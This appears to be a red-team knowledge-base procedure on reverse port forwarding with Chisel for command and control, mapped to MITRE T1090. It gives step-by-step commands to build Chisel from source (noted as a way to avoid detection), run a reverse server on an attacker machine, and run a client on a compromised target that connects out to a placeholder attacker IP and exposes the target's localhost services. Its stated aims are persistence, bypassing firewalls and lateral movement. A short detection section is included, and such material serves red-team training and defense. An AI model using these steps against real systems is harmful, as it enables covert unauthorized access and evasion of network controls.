---
type: procedure
verified: true
submitted: true
created_at: '2019-11-22T19:31:39Z'
updated_at: '2023-07-15T01:44:23Z'
tactics:
  - '[[Command and Control]]'
techniques:
  - '[[Connection Proxy]]'
sub_techniques: []
tags:
  - network
  - tunneling
  - proxy
commands:
  - '[[commands/chisel-server-reverse-tunnel]]'
  - '[[commands/chisel-client-reverse-port-forward]]'
platforms:
  - Linux
  - Windows
tools:
  - '[[tools/Chisel]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Remote-Port-Forwarding-Using-Chisel

## Summary

This procedure demonstrates how to set up remote port forwarding using Chisel, a fast TCP/UDP tunnel over HTTP, to allow access to services bound to localhost (127.0.0.1) on a target system from a remote attacker's machine. It is useful in scenarios where direct network access is restricted, enabling attackers to tunnel traffic through an HTTP proxy-like connection for command and control or lateral movement.

## Description

Remote port forwarding forwards traffic from a local port on the attacker's machine to a remote service on the target, effectively bypassing network restrictions such as firewalls that block outbound connections to certain ports. Chisel uses WebSockets over HTTP for the tunnel, making it suitable for environments with HTTP proxies or restrictive egress filtering. This technique maps to MITRE ATT&CK T1090 (Connection Proxy) under the Command and Control tactic (TA0011). It requires initial access to the target (e.g., via SSH or compromised host) and assumes the attacker controls the server endpoint. The procedure involves building Chisel from source (for custom platforms), launching a reverse tunnel server on the attacker machine, and connecting the client on the target to forward the desired port.

## Requirements

1. Go (Golang) installed on a build machine (version 1.13 or later) for compiling Chisel binaries.
2. Initial shell access to the target system (Linux or Windows) to execute the Chisel client.
3. Network connectivity from target to attacker machine on the chosen listen port (e.g., 8080 for HTTP).
4. Attacker machine with public or reachable IP for the Chisel server.
5. Optional: Cross-compilation environment if targeting Windows from Linux or vice versa.

## Defense

Defensive measures and detection strategies:

- Monitor for unusual outbound WebSocket connections (ws://) to non-standard ports using network intrusion detection systems (NIDS) like Suricata.
- Enable application-layer logging for HTTP proxies to detect anomalous tunneling patterns.
- Use endpoint detection and response (EDR) tools to flag unknown binaries like Chisel.exe or chisel being executed.
- Restrict outbound connections to only approved domains/ports via firewall rules.
- Implement behavioral analytics to detect process spawning of Go-based binaries in unexpected contexts.

## Objectives

1. Establish a persistent tunnel for remote access to target services.
2. Bypass localhost binding restrictions to access internal services externally.
3. Maintain command and control in restricted network environments.
4. Enable further post-exploitation activities like lateral movement.

## Instructions

### Step 1: Clone and Build Chisel Binary

**Context**: Download and compile the Chisel tool from source to obtain the executable for the target platform. This ensures compatibility and avoids detection from pre-built binaries.

```bash
git clone https://github.com/jpillora/chisel.git
cd chisel && go build
```

> This clones the repository and builds the chisel binary in the current directory. For Windows targets, use cross-compilation: `GOOS=windows GOARCH=amd64 go build` to generate chisel.exe. Expected output: No errors, and a `chisel` (or `chisel.exe`) binary is created. Verify with `./chisel --help`.

### Step 2: Launch Chisel Server on Attacker Machine

**Context**: Start the Chisel server to listen for incoming client connections and enable reverse tunneling mode, allowing the target to initiate the connection.

**Command** ([[commands/chisel-server-reverse-tunnel]]):
```bash
./chisel server -p $_LISTEN_PORT --reverse
```

> Replace $_LISTEN_PORT with a port like 9001. This starts the server in reverse mode, fingerprinting the connection for security. Expected output includes confirmation of reverse tunneling enabled and listening status.

### Step 3: Launch Chisel Client on Target Machine

**Context**: Connect the target to the attacker server and specify the reverse port forward (R:$_REMOTE_PORT:$_LOCAL_PORT), where traffic to $_REMOTE_PORT on the attacker will forward to $_LOCAL_PORT on the target.

**Command** ([[commands/chisel-client-reverse-port-forward]]):
```bash
./chisel client $_ATTACKER_IP:$_ATTACKER_PORT R:$_REMOTE_PORT:$_LOCAL_PORT
```

> Replace $_ATTACKER_IP with the attacker's IP, $_ATTACKER_PORT with the server port (e.g., 9001), $_REMOTE_PORT with the port to listen on attacker (e.g., 9999), and $_LOCAL_PORT with the target's service port (e.g., 8080 for a localhost web service). Expected output: Connection established with latency reported. Once connected, access the target's localhost service by connecting to localhost:$_REMOTE_PORT on the attacker machine.
